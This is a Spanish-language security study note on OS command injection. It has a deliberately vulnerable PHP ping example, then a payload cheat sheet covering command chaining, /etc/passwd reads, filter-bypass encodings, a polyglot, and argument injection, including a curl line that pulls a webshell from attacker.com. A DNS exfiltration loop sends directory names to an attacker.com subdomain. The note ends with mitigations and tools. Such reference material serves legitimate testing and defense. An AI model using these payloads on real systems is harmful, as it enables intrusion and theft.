---
tags:
  - seguridad-web
  - owasp
  - command-injection
aliases:
  - Command Injection
  - Inyección de comandos
---

# Inyección de comandos

**La inyección de comandos** (o shell injection) permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor a través de una aplicación vulnerable. Puede llevar al compromiso total de la máquina.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

Ocurre cuando una aplicación pasa datos no saneados del usuario (formularios, cookies, cabeceras HTTP, etc.) directamente a una shell del sistema. El atacante encadena sus propios comandos a los que la aplicación ejecuta legítimamente.

Ejemplo típico en PHP que hace ping a una IP recibida por el usuario:

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

Si el atacante envía `8.8.8.8; cat /etc/passwd`, el comando ejecutado pasa a ser `ping -c 4 8.8.8.8; cat /etc/passwd`, revelando el contenido de `/etc/passwd`. El impacto puede escalar hasta ejecución remota de código (RCE) y control total del host.

## Detección y pruebas

- Inyectar metacaracteres de la shell en parámetros que parezcan llegar a comandos del sistema (campos de ping, conversión de archivos, etc.).
- Confirmar con comandos inocuos: `whoami`, `id`, `cat /etc/passwd`.
- **Inyección ciega** (sin salida visible): confirmar por **tiempo** (`sleep`) o por **interacción out-of-band** (DNS/HTTP a un servidor controlado).

## Explotación / payloads

### Encadenado de comandos

| Operador | Efecto |
|---|---|
| `;` | Ejecuta el segundo comando de forma secuencial |
| `&&` | Ejecuta el segundo solo si el primero tiene éxito |
| `\|\|` | Ejecuta el segundo solo si el primero falla |
| `&` | Ejecuta en segundo plano |
| `\|` | Conecta la salida del primero con la entrada del segundo |

### Dentro de un comando (backticks y sustitución)

```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

### Inyección de argumentos

Cuando solo puedes añadir argumentos a un comando ya fijado, se abusa de opciones peligrosas:

```bash
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
psql -o'|id>/tmp/foo'
curl http://attacker.com/ -o webshell.php   # escribe un webshell
```

### Bypass de filtros

- **Sin espacios**: usar `${IFS}`, expansión de llaves o redirección de entrada.

```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
;ls%09-al%09/home   # %09 = tab
```

- **Salto de línea / barra invertida** para partir comandos:

```bash
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

- **Sin barra (`/`)** mediante expansión de variables y `tr`:

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

- **Codificación hexadecimal**:

```bash
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
cat `xxd -r -p <<< 2f6574632f706173737764`
```

- **Romper palabras clave** con comillas, backticks o `$@`/`$()`:

```bash
w'h'o'am'i
wh``oami
who$@ami
who$()ami
```

- **Comodines** y **mayúsculas/minúsculas aleatorias** (útil en Windows, insensible a mayúsculas):

```bash
/???/??t /???/p??s??
wHoAmi
```

### Exfiltración de datos

- **Basada en tiempo** (carácter a carácter según el retardo):

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

- **Basada en DNS** (cuando no hay salida directa):

```bash
for i in $(ls /); do host "$i.SUBDOMINIO.attacker.com"; done
```

### Polyglot

Payload válido en varios contextos de comillas a la vez:

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

### Trucos

- Mantener procesos largos vivos con `nohup ... &` para evitar timeouts del proceso padre.
- Tras la inyección, usar `--` para forzar el fin de opciones y descartar argumentos posteriores.

## Mitigación

- **Evitar invocar la shell**: usar APIs que ejecuten programas sin intérprete (p. ej. `execve` con argumentos en lista, no cadena), nunca `system()`/`shell_exec()` con entrada del usuario.
- **Allowlist** estricta de valores permitidos en lugar de blocklist de caracteres.
- **Validación y escapado** del contexto (con cautela: `escapeshellarg`/`escapeshellcmd` tienen bypasses conocidos).
- **Mínimo privilegio** para el proceso de la aplicación.
- Preferir bibliotecas nativas del lenguaje para la tarea (resolver DNS, comprimir, etc.) en vez de llamar a binarios del sistema.

## Herramientas

- **commix** — detección y explotación automática de inyección de comandos del SO.
- **interactsh** — servidor/cliente OOB para detectar interacciones (DNS/HTTP) en inyecciones ciegas.

---
🔗 Relacionado: [[Inyección SQL (SQLi)]] · [[XXE (XML External Entity)]] · [[Laboratorio DVWA (CTF)]] · [[Metasploit y Payload Reverse TCP]]
📚 Fuente: [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) (MIT, © Swissky)
